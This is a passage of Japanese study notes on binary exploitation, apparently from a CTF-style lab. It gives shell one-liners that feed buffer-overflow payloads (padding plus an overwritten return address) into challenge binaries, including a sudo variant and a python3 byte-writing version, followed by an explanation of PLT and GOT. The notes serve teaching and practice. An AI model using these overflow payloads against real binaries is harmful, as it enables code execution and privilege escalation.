...
```sh
{ python2 -c 'print "A" * 80 + "\xa7\x06\x40\x00\x00\x00\x00\x00"'; cat; } | ./foo

# sudo バイナリの場合
{ python2 -c 'print "A" * 80 + "\xa7\x06\x40\x00\x00\x00\x00\x00"'; cat; } | sudo /foo
```

python3 の場合、ASCII 範囲外の文字がUTF-8に変換される（例：`\xA0 (U+00A0) -> UTF-8: \xC2 \xA0`）ため意図しない動作になるので下記のようにする。

```sh
{ python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 43 + b"\xA0\x99\x20\x5E")'; cat; } | /challenge/binary-exploitation-var-control-w
```
...
- PLT（Procedure Link Table）。関数の PLT アドレスを呼び出すことは、関数自体を呼び出すことと同じ。実際はGOTアドレスへのjmp命令が入っている。

PLTアドレスを調べると、GOTアドレスへのjmp命令が見える。
...
| -------------- | -------------------------------------- | ----------------------------------------- |
| 役割           | 関数呼び出し用のジャンプ表（GOTアドレスへのjmp命令） | 実アドレスを保持するテーブル              |
